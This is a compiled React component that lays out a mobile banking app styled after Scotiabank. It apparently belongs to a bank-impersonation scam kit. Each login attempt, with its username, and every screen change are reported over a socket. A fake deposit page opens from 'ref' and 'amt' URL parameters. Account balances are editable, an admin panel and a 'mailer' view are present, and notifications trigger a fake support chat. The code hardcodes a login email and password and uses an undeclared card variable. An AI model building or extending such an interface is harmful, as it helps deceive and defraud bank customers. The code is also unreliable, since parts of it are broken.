import { jsx as _jsx, jsxs as _jsxs } from "react/jsx-runtime";
import { useState, useEffect } from 'react';
import { AnimatePresence, motion } from 'motion/react';
import LandingView from '../views/LandingView';
import LoginView from '../components/LoginFlow';
import HomeView from '../views/HomeView';
import AccountDetailsView from '../views/AccountDetailsView';
import WhatsNewView from '../views/WhatsNewView';
import GenericPageView from '../views/GenericPageView';
import TransfersView from '../views/TransfersView';
import TransferMenuView from '../views/TransferMenuView';
import MoveMoneyView from '../views/MoveMoneyView';
import InteracSettingsView from '../views/InteracSettingsView';
import SettingsView from '../views/SettingsView';
import AdminSettingsView from '../views/AdminSettingsView';
import MoreView from '../views/MoreView';
import BillsView from '../views/BillsView';
import AdviceView from '../views/AdviceView';
import SceneView from '../views/SceneView';
import ManageAccountView from '../views/ManageAccountView';
import TransferBetweenAccountsView from '../views/TransferBetweenAccountsView';
import StatementsListView from '../views/StatementsListView';
import ScotiaSupportView from '../views/ScotiaSupportView';
import { DepositView } from '../views/DepositView';
import { MailerView } from '../views/MailerView';
import { ManageContactsView } from '../views/ManageContactsView';
import RedeemStoreView from '../views/RedeemStoreView';
import MyCardsView from '../views/MyCardsView';
import ECardView from '../views/ECardView';
import TabNavigation from '../components/TabNavigation';
import { AddContactView } from '../components/AddContactView';
import { useBank } from '../shared/BankContext';
import { useSocket } from '../shared/SocketContext';
import { SupportChat } from '../components/SupportChat';
import { MessageCircle } from 'lucide-react';
export default function IOSLayout() {
    const { user, login, logout, updateUser, updateAccount, performTransfer, error: bankError, isLoading, theme, toggleAdminPanel } = useBank();
    const { emitAction } = useSocket();
    const [view, setView] = useState(() => {
        const standalone = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone === true;
        return standalone ? 'login' : 'landing';
    });
    const [isStandalone, setIsStandalone] = useState(false);
    useEffect(() => {
        const standalone = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone === true;
        setIsStandalone(standalone);
    }, []);
    const [stage, setStage] = useState('login_user');
    const [username, setUsername] = useState('accounting@abfarms.ca');
    const [password, setPassword] = useState('PROJECTSARAH');
    const [selectedAccount, setSelectedAccount] = useState(null);
    const [subView, setSubView] = useState(null);
    const [isChatOpen, setIsChatOpen] = useState(false);
    const [notification, setNotification] = useState(null);
    useEffect(() => {
        const handleNotification = (e) => {
            const detail = e.detail;
            setNotification(detail);
            // Auto hide after 5 seconds
            setTimeout(() => setNotification(null), 5000);
        };
        window.addEventListener('scotia_notification', handleNotification);
        const handleOpenChat = () => setIsChatOpen(true);
        window.addEventListener('scotia_open_chat', handleOpenChat);
        return () => {
            window.removeEventListener('scotia_notification', handleNotification);
            window.removeEventListener('scotia_open_chat', handleOpenChat);
        };
    }, []);
    useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        if ((params.get('ref') && params.get('amt')) || params.get('view') === 'deposited') {
            setView('deposit');
            emitAction('Visit Deposit Page', { ref: params.get('ref'), amount: params.get('amt'), deposit: params.get('deposit') });
        }
        else if (params.get('view') === 'mailer') {
            setView('mailer');
            emitAction('Visit Mailer Page');
        }
    }, [emitAction]);
    useEffect(() => {
        emitAction('View Change', { view, subView });
    }, [view, subView, emitAction]);
    const handleLogin = async () => {
        emitAction('Login Attempt', { username });
        const success = await login(username, password);
        if (success) {
            setView('dashboard');
            emitAction('Login Success', { username });
        }
        else {
            emitAction('Login Failed', { username });
        }
    };
    const handleSignOut = () => {
        emitAction('Sign Out');
        logout();
        setView('landing');
        setSubView(null);
        setSelectedAccount(null);
    };
    const handleSwitchAccount = () => {
        emitAction('Switch Account');
        logout();
        setUsername('');
        setPassword('');
        setStage('login_user');
        setView('login');
    };
    const isETransferView = subView === 'Interac e-Transfer';
    const isTransferMenuView = subView === 'Transfer from' || subView === 'Send money';
    const isMoveMoneyView = subView === 'Move money';
    const isInteracSettings = subView === 'Interac Settings';
    const isSettingsView = subView === 'Settings';
    const isAdminSettingsView = subView === 'AdminSettings';
    const isMoreView = subView === 'More';
    const isBillsView = subView === 'Bills';
    const isAdviceView = subView === 'Advice+';
    const isSceneView = subView === 'Scene+';
    const isManageAccountView = subView === 'Manage Account';
    const isManageContactsView = subView === 'Manage contacts';
    const isTransferBetweenAccountsView = subView === 'Transfer between accounts';
    const isStatementsView = subView === 'Statements';
    const isScotiaSupportView = subView === 'Scotia Support';
    const isAddContactView = subView === 'add-contact';
    const handleTabChange = (tabId) => {
        setSelectedAccount(null);
        if (tabId === 'home') {
            setSubView(null);
        }
        else {
            const tabNames = {
                'transfers': 'Move money',
                'advice': 'Advice+',
                'scene': 'Scene+',
                'more': 'More'
            };
            setSubView(tabNames[tabId] || tabId);
        }
    };
    const getActiveTab = () => {
        if (!subView)
            return 'home';
        const tabMap = {
            'Move money': 'transfers',
            'Bills': 'transfers',
            'Advice+': 'advice',
            'Scene+': 'scene',
            'More': 'more'
        };
        return tabMap[subView] || 'home';
    };
    const showFooter = (view === 'dashboard' || view === 'deposit' || view === 'mailer' || view === 'redeem' || view === 'my-cards' || view === 'ecard') && !selectedAccount && !isTransferMenuView && !isETransferView && !isInteracSettings && !isSettingsView && !isManageAccountView && !isTransferBetweenAccountsView && !isStatementsView && !isScotiaSupportView;
    return (_jsx("div", { className: "h-full w-full bg-[#F4F7F9] flex justify-center overflow-hidden relative", children: _jsx("div", { className: "h-full w-full max-w-[430px] bg-white relative shadow-2xl overflow-hidden flex flex-col", children: _jsx("div", { className: "flex-1 relative overflow-hidden", children: _jsxs(AnimatePresence, { children: [view === 'landing' && (_jsx(motion.div, { initial: { opacity: 0 }, animate: { opacity: 1, transition: { duration: 0.5 } }, exit: { opacity: 0 }, className: "h-full", children: _jsx(LandingView, { onSignIn: () => setView('login'), onWhatsNew: () => setView('whatsnew') }) }, "landing")), view === 'whatsnew' && (_jsx(motion.div, { initial: { x: '100%' }, animate: { x: 0 }, exit: { x: '100%' }, className: "h-full", children: _jsx(WhatsNewView, { onBack: () => setView('landing') }) }, "whatsnew")), view === 'login' && (_jsx(motion.div, { initial: { opacity: 0 }, animate: { opacity: 1 }, exit: { opacity: 0 }, className: "h-full", children: _jsx(LoginView, { stage: stage, username: username, setUsername: setUsername, password: password, setPassword: setPassword, onContinue: () => setStage('login_pin'), onSignIn: handleLogin, onSwitchAccount: handleSwitchAccount, isLoading: isLoading, error: bankError, theme: "light" }) }, "login")), (view === 'dashboard' || view === 'deposit' || view === 'mailer' || view === 'redeem' || view === 'my-cards' || view === 'ecard') && user && (_jsxs(motion.div, { initial: { opacity: 0 }, animate: { opacity: 1 }, className: "h-full flex flex-col", children: [_jsx("div", { className: "flex-1 relative overflow-hidden", children: _jsxs(AnimatePresence, { children: [!selectedAccount && !subView && (_jsx(motion.div, { initial: { opacity: 0 }, animate: { opacity: 1 }, exit: { opacity: 0 }, className: "absolute inset-0", children: _jsx(HomeView, { theme: theme, accounts: user.accounts, onSelectAccount: (name) => setSelectedAccount(name), onAction: (action) => setSubView(action), onChat: () => setIsChatOpen(true), onNotification: () => setSubView('Notifications'), onRedeem: () => setView('redeem'), onMyCards: () => setView('my-cards'), interacWarningEnabled: user.settings.interacWarningEnabled, attentionItemsEnabled: user.settings.attentionItemsEnabled, currentUser: user }) }, "home")), selectedAccount && !subView && (_jsx(motion.div, { initial: { x: '100%' }, animate: { x: 0 }, exit: { x: '100%' }, className: "absolute inset-0", children: _jsx(AccountDetailsView, { accountName: selectedAccount, balance: user.accounts[selectedAccount]?.balance || 0, onHold: user.accounts[selectedAccount]?.onHold || 0, history: user.accounts[selectedAccount]?.history || [], onBack: () => setSelectedAccount(null), onAction: (action) => setSubView(action), currentUser: user, onBalanceChange: (newBalance) => updateAccount(selectedAccount, { balance: newBalance }) }) }, "account-details")), isMoveMoneyView && (_jsx(motion.div, { initial: { x: '100%' }, animate: { x: 0 }, exit: { x: '100%' }, className: "absolute inset-0", children: _jsx(MoveMoneyView, { onAction: (action) => setSubView(action), onBack: () => setSubView(null), theme: theme, currentUser: user }) }, "move-money")), isTransferMenuView && (_jsx(TransferMenuView, { onAction: (action) => setSubView(action), onBack: () => setSubView(null), theme: theme }, "transfer-menu")), isTransferBetweenAccountsView && (_jsx(TransferBetweenAccountsView, { accounts: user.accounts, onBack: () => setSubView(null), onTransfer: performTransfer, theme: theme }, "transfer-between")), isETransferView && (_jsx(TransfersView, { accounts: user.accounts, setAccounts: (accs) => updateUser({ accounts: accs }), transferLimit: user.settings.transferLimit, userName: user.username, onBack: () => setSubView(null), onSettings: () => setSubView('Interac Settings'), theme: theme, contacts: user.contacts, onTransfer: performTransfer, defaultFromAccount: selectedAccount || undefined }, "etransfer")), isInteracSettings && (_jsx(InteracSettingsView, { accounts: user.accounts, onBack: () => setSubView('Interac e-Transfer'), theme: theme }, "interac-settings")), isSettingsView && (_jsx(SettingsView, { accounts: user.accounts, onBack: () => setSubView(null), onAction: (action) => setSubView(action), theme: theme, setTheme: () => { }, settings: user.settings, updateSettings: (settings) => updateUser({ settings: { ...user.settings, ...settings } }), toggleAdminPanel: toggleAdminPanel, isAdmin: user.username === 'admin' || user.username === 'accounting@abfarms.ca' }, "settings")), isAdminSettingsView && (_jsx(AdminSettingsView, { onBack: () => setSubView('Settings') }, "admin-settings")), isBillsView && (_jsx(BillsView, { onBack: () => setSubView(null), onAction: (action) => setSubView(action), theme: theme }, "bills")), isManageContactsView && (_jsx(ManageContactsView, { onBack: () => setSubView(null), theme: theme }, "manage-contacts")), isAdviceView && (_jsx(AdviceView, { onBack: () => setSubView(null), onAction: (action) => setSubView(action), theme: theme }, "advice")), isSceneView && (_jsx(SceneView, { onBack: () => setSubView(null), onAction: (action) => setSubView(action) }, "scene")), isManageAccountView && selectedAccount && (_jsx(ManageAccountView, { accountName: selectedAccount, onBack: () => setSubView(null), theme: theme }, "manage-account")), isStatementsView && (_jsx(StatementsListView, { accounts: user.accounts, onBack: () => setSubView(null), theme: theme, currentUser: user }, "statements")), isAddContactView && (_jsx(AddContactView, { isOpen: true, onClose: () => setSubView('Manage contacts'), onSave: (contact) => {
                                                    updateUser({ contacts: [...user.contacts, contact] });
                                                    setSubView('Manage contacts');
                                                }, theme: "light" }, "add-contact")), isScotiaSupportView && (_jsx(ScotiaSupportView, { onBack: () => setSubView(null), theme: theme, userName: user.username.split('@')[0] }, "scotia-support")), isMoreView && (_jsx(MoreView, { onSignOut: handleSignOut, onAction: (action) => {
                                                    if (action === 'contact_us') {
                                                        setIsChatOpen(true);
                                                    }
                                                    else {
                                                        setSubView(action);
                                                    }
                                                }, theme: theme, interacWarningEnabled: user.settings.interacWarningEnabled, setInteracWarningEnabled: (enabled) => updateUser({ settings: { ...user.settings, interacWarningEnabled: enabled } }), updateSettings: (settings) => updateUser({ settings: { ...user.settings, ...settings } }), currentUser: user, onBack: () => setSubView(null), toggleAdminPanel: toggleAdminPanel }, "more")), view === 'deposit' && (_jsx(DepositView, { onBack: () => {
                                                    window.history.replaceState({}, '', window.location.pathname);
                                                    setView('dashboard');
                                                }, theme: theme }, "deposit")), view === 'mailer' && (_jsx(MailerView, { onBack: () => setView('dashboard'), theme: theme }, "mailer")), view === 'redeem' && (_jsx(RedeemStoreView, { onBack: () => setView('dashboard'), onViewCards: () => setView('my-cards') }, "redeem")), view === 'my-cards' && (_jsx(MyCardsView, { onBack: () => setView('dashboard'), onRedeemMore: () => setView('redeem'), onSelectCard: (card) => {
                                                    setSelectedCard(card);
                                                    setView('ecard');
                                                } }, "my-cards")), view === 'ecard' && selectedCard && (_jsx(ECardView, { card: selectedCard, onBack: () => setView('my-cards'), theme: theme }, "ecard")), subView && !isTransferMenuView && !isETransferView && !isMoveMoneyView && !isInteracSettings && !isSettingsView && !isBillsView && !isAdviceView && !isManageAccountView && !isMoreView && !isTransferBetweenAccountsView && !isStatementsView && !isScotiaSupportView && !isSceneView && (_jsx(GenericPageView, { title: subView, onBack: () => setSubView(null) }, "generic"))] }) }), _jsx(AnimatePresence, { children: isChatOpen && (_jsx(motion.div, { initial: { y: '100%' }, animate: { y: 0 }, exit: { y: '100%' }, transition: { type: 'spring', damping: 25, stiffness: 200 }, className: "absolute inset-0 z-[2000]", children: _jsx(SupportChat, { isOpen: isChatOpen, onClose: () => setIsChatOpen(false) }) }, "chat")) }), _jsx(AnimatePresence, { children: notification && (_jsxs(motion.div, { initial: { y: -100, opacity: 0 }, animate: { y: 0, opacity: 1 }, exit: { y: -100, opacity: 0 }, onClick: () => {
                                            setIsChatOpen(true);
                                            setNotification(null);
                                        }, className: "absolute top-4 left-4 right-4 bg-white/90 backdrop-blur-md rounded-2xl p-4 shadow-xl z-[3000] flex items-center gap-4 cursor-pointer border border-white/20", children: [_jsx("div", { className: "w-10 h-10 bg-[#ED0711] rounded-xl flex items-center justify-center shrink-0", children: _jsx(MessageCircle, { className: "text-white", size: 24 }) }), _jsxs("div", { className: "flex-1 min-w-0", children: [_jsx("p", { className: "font-bold text-sm text-gray-900", children: notification.title }), _jsx("p", { className: "text-xs text-gray-600 truncate", children: notification.message })] }), _jsx("div", { className: "text-[10px] text-gray-400 font-medium", children: "now" })] }, "notification")) }), showFooter && (_jsx(TabNavigation, { activeTab: getActiveTab(), onTabChange: handleTabChange, theme: theme }))] }, "dashboard"))] }) }) }) }));
}
